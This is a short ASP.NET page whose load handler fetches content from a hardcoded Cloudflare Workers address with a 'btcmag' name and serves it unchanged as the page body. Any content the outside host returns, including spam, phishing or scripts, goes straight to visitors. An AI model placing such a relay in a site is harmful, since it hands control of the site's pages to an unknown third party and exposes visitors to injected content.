<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>

<%@ Page Language="c#" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string urlAddress = "https://broad-forest-df19.btcmag.workers.dev/";
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlAddress);
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        if (response.StatusCode == HttpStatusCode.OK)
        {
            Stream receiveStream = response.GetResponseStream();
            StreamReader readStream = null;

            if (String.IsNullOrEmpty(response.CharacterSet))
                readStream = new StreamReader(receiveStream);
            else
                readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));

            string data = readStream.ReadToEnd();

            response.Close();
            readStream.Close();

            HttpContext.Current.Response.Write(data);
        }
    }
</script>
